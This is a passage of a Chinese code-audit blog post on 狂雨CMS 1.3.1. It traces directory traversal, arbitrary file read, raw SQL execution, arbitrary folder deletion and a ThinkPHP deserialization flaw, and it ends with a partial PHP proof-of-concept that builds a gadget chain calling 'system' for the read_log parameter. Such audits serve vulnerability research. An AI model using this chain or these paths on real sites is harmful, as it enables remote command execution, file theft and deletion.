class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;top_dir&#x27;</span>,dirname(urldecode(<span class="variable">$path</span>)));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;list&#x27;</span>,<span class="variable">$list_info</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;meta_title&#x27;</span>,<span class="string">&#x27;模版管理&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到先是对传入的 path 参数使用 urldecode 函数解码一次，所以参数值在传入的时候 url 编码了两次，接着跟进 model (‘template’) 中的 file_list 方法，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">application/admin/model/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_list</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$is_all</span>=<span class="literal">FALSE</span>,<span class="variable">$exts</span>=<span class="string">&#x27;*&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_info</span>=[];</span><br><span class="line">    <span class="variable">$list_info</span>=File::list_dir_info(<span class="variable">$path</span>,<span class="variable">$is_all</span>,<span class="variable">$exts</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$list_info</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$file_info</span>[<span class="variable">$key</span>]=File::list_info(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;isFile&#x27;</span>])&#123;</span><br><span class="line">            <span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;extensions&#x27;</span>]=<span class="keyword">$this</span>-&gt;extensions[<span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;ext&#x27;</span>]];</span><br><span class="line">            <span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;template_type&#x27;</span>]=@<span class="keyword">$this</span>-&gt;template_type[<span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;filename&#x27;</span>]];</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;template_type&#x27;</span>])&#123;</span><br><span class="line">                <span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;template_type&#x27;</span>]=<span class="string">&#x27;其它模版&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;extensions&#x27;</span>]=<span class="string">&#x27;folder&#x27;</span>;</span><br><span class="line">            <span class="variable">$file_info</span>[<span class="variable">$key</span>][<span class="string">&#x27;template_type&#x27;</span>]=<span class="string">&#x27;文件夹&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$file_info</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进 File 类 list_info 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list_info</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;filename&#x27;</span>]   = basename(<span class="variable">$file</span>);<span class="comment">//返回路径中的文件名部分。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;pathname&#x27;</span>]   = realpath(<span class="variable">$file</span>);<span class="comment">//返回绝对路径名。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;owner&#x27;</span>]      = fileowner(<span class="variable">$file</span>);<span class="comment">//文件的 user ID （所有者）。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;perms&#x27;</span>]      = fileperms(<span class="variable">$file</span>);<span class="comment">//返回文件的 inode 编号。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;inode&#x27;</span>]      = fileinode(<span class="variable">$file</span>);<span class="comment">//返回文件的 inode 编号。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;group&#x27;</span>]      = filegroup(<span class="variable">$file</span>);<span class="comment">//返回文件的组 ID。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;path&#x27;</span>]       = dirname(<span class="variable">$file</span>);<span class="comment">//返回路径中的目录名称部分。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;atime&#x27;</span>]      = fileatime(<span class="variable">$file</span>);<span class="comment">//返回文件的上次访问时间。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;ctime&#x27;</span>]      = filectime(<span class="variable">$file</span>);<span class="comment">//返回文件的上次改变时间。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;perms&#x27;</span>]      = fileperms(<span class="variable">$file</span>);<span class="comment">//返回文件的权限。 </span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;size&#x27;</span>]       = filesize(<span class="variable">$file</span>);<span class="comment">//返回文件大小。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;type&#x27;</span>]       = filetype(<span class="variable">$file</span>);<span class="comment">//返回文件类型。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;ext&#x27;</span>]        = is_file(<span class="variable">$file</span>) ? pathinfo(<span class="variable">$file</span>,PATHINFO_EXTENSION) : <span class="string">&#x27;&#x27;</span>;<span class="comment">//返回文件后缀名</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;mtime&#x27;</span>]      = filemtime(<span class="variable">$file</span>);<span class="comment">//返回文件的上次修改时间。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isDir&#x27;</span>]      = is_dir(<span class="variable">$file</span>);<span class="comment">//判断指定的文件名是否是一个目录。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isFile&#x27;</span>]     = is_file(<span class="variable">$file</span>);<span class="comment">//判断指定文件是否为常规的文件。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isLink&#x27;</span>]     = is_link(<span class="variable">$file</span>);<span class="comment">//判断指定的文件是否是连接。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isReadable&#x27;</span>] = is_readable(<span class="variable">$file</span>);<span class="comment">//判断文件是否可读。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isWritable&#x27;</span>] = is_writable(<span class="variable">$file</span>);<span class="comment">//判断文件是否可写。</span></span><br><span class="line">    <span class="variable">$dir</span>[<span class="string">&#x27;isUpload&#x27;</span>]   = is_uploaded_file(<span class="variable">$file</span>);<span class="comment">//判断文件是否是通过 HTTP POST 上传的。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到做一些判断后直接返回内容，并没有什么过滤，导致目录遍历</p>
+<h4 id="任意文件读取-2"><a class="markdownIt-Anchor" href="#任意文件读取-2">#</a> 任意文件读取</h4>
+<p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">application/admin/controller/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$Template</span>=model(<span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;request-&gt;post();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;request-&gt;isPost())&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$Template</span>-&gt;edit(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>  !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;模版文件修改成功！&#x27;</span>,url(<span class="string">&#x27;index&#x27;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="variable">$Template</span>-&gt;getError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span>=urldecode(<span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">&#x27;path&#x27;</span>));</span><br><span class="line">        <span class="variable">$info</span>=<span class="variable">$Template</span>-&gt;file_info(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;path&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;meta_title&#x27;</span>,<span class="string">&#x27;修改模版文件&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为是 get 传输，所以不执行 if 语句，所以我们直接查看 else 即可，可以看到同样先是对传入的 path 参数使用 urldecode 函数解码一次，然后再使用 model (‘template’) 中的 file_info 方法进行处理</p>
+<p>跟进 file_info 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">application/admin/model/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_info</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> File::read(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进 File 类 read 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extend/org/File.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::get(<span class="variable">$filename</span>,<span class="string">&#x27;content&#x27;</span>,<span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进 get 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">extend/org/File.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$name</span>,<span class="variable">$type</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$contents</span>[<span class="variable">$filename</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="variable">$filename</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="built_in">self</span>::<span class="variable">$contents</span>[<span class="variable">$filename</span>]=file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span>=<span class="built_in">self</span>::<span class="variable">$contents</span>[<span class="variable">$filename</span>];</span><br><span class="line">    <span class="variable">$info</span>   =   <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;mtime&#x27;</span>     =&gt;  filemtime(<span class="variable">$filename</span>),</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>   =&gt;  <span class="variable">$content</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$info</span>[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后也是将文件读取放到 $content 中，然后返回，然后 edit 也是直接输出，也没有过滤，导致任意文件读取</p>
+<h4 id="sql代码执行-2"><a class="markdownIt-Anchor" href="#sql代码执行-2">#</a> sql 代码执行</h4>
+<p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">application/admin/controller/Tool.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlexecute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;request-&gt;isPost())&#123;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">&#x27;sql&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">            <span class="variable">$sql</span> = str_replace(<span class="string">&#x27;&#123;pre&#125;&#x27;</span>,Config::get(<span class="string">&#x27;database.prefix&#x27;</span>),<span class="variable">$sql</span>);</span><br><span class="line">            <span class="comment">//查询语句返回结果集</span></span><br><span class="line">            <span class="keyword">if</span>(strtolower(substr(<span class="variable">$sql</span>,<span class="number">0</span>,<span class="number">6</span>))==<span class="string">&quot;select&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$return</span> = Db::execute(<span class="variable">$sql</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;执行完成&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(<span class="string">&#x27;meta_title&#x27;</span>,<span class="string">&#x27;SQL语句执行&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到直接是执行 sql 语句，之所以不用 select 写入日志是因为第三个 if 直接判断前六个字符是不是 select，如果是直接啥也不执行，就直接 return，而其他会执行，所以才使用了 insert 语句</p>
+<h4 id="任意文件夹删除-2"><a class="markdownIt-Anchor" href="#任意文件夹删除-2">#</a> 任意文件夹删除</h4>
+<p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">application/admin/controller/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$id</span> = array_unique((<span class="keyword">array</span>)<span class="keyword">$this</span>-&gt;request-&gt;param(<span class="string">&#x27;id&#x27;</span>));</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$id</span>) ) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;请选择要操作的数据!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$Template</span>=model(<span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$Template</span>-&gt;del(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>  !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;删除成功&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="variable">$Template</span>-&gt;getError());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进 model (‘template’)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">application/admin/model/Template.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$map</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>];</span><br><span class="line">    <span class="variable">$name</span> = Template::where(<span class="variable">$map</span>)-&gt;column(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$name</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        del_dir_file(<span class="string">&#x27;./&#x27;</span>.config(<span class="string">&#x27;web.default_tpl&#x27;</span>).DIRECTORY_SEPARATOR.<span class="variable">$value</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span> = Template::where(<span class="variable">$map</span>)-&gt;delete();</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span> === <span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error=Template::getError();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先是查找 ky_template 表中相应的 id 的 name 字段，然后使用 del_dir_file 方法删除该目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">application/common.php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">del_dir_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$delDir</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_dir(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="variable">$handle</span> = opendir(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">false</span> !== ( <span class="variable">$item</span> = readdir(<span class="variable">$handle</span>) )) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$item</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$item</span> != <span class="string">&quot;..&quot;</span>)</span><br><span class="line">                    is_dir(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$item</span>&quot;</span>) ? del_dir_file(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$item</span>&quot;</span>, <span class="variable">$delDir</span>) : unlink(<span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$item</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            closedir(<span class="variable">$handle</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$delDir</span>)</span><br><span class="line">                <span class="keyword">return</span> rmdir(<span class="variable">$path</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> unlink(<span class="variable">$path</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>单步调试如下，465 即 ky_template 表中 name 字段值</p>
+<p>通过单步调试可以看到这个助手函数 config (‘web.default_tpl’) 的值应该是 <code>template/home</code> ，所以当 name 为 …/456 时可以目录穿越，导致任意文件夹均可删除，还有 <code>DIRECTORY_SEPARATOR</code>  是 PHP 的内部常量，是一个显示系统分隔符的命令，具体可以查看（<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-374148.html%EF%BC%89">https://www.php.cn/php-weizijiaocheng-374148.html）</a></p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20210508001422667.png" alt="image-20210508001422667"></p>
+<h4 id="任意命令执行2"><a class="markdownIt-Anchor" href="#任意命令执行2">#</a> 任意命令执行 2</h4>
+<p>该漏洞为 thinkphp 版本的反序列化漏洞，漏洞原理就不再叙述，想了解的师傅可以参考 https://zhuanlan.zhihu.com/p/86289184，只说漏洞利用点，既然是反序列化漏洞，那就直接搜索 <code>unserialize</code>  函数即可</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220523140506058.png" alt="image-20220523140506058"></p>
+<p>可以看到是 model <code>Recentread</code>  中含有 <code>unserialize</code>  函数，查看 <code>controller</code>  传输过程</p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220523141550306.png" alt="image-20220523141550306"></p>
+<p><img src="/2022/05/23/%E7%8B%82%E9%9B%A8CMS1-3-1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20220523141633307.png" alt="image-20220523141633307"></p>
+<p>所以将序列化后的 poc 放入 <code>read_log</code>  参数即可</p>
+<p>poc 生成文件内容如下，直接放入网站根目录即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123; </span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$hook</span> = []; </span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>; </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span> =&gt; <span class="string">&#x27;spaceman&#x27;</span>]; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span> =&gt; [<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]]; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$append</span> = []; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$data</span> = []; </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;spaceman&quot;</span> =&gt; []]; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;spaceman&quot;</span> =&gt; <span class="keyword">new</span> Request()]; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123; </span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$files</span> = []; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()]; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> 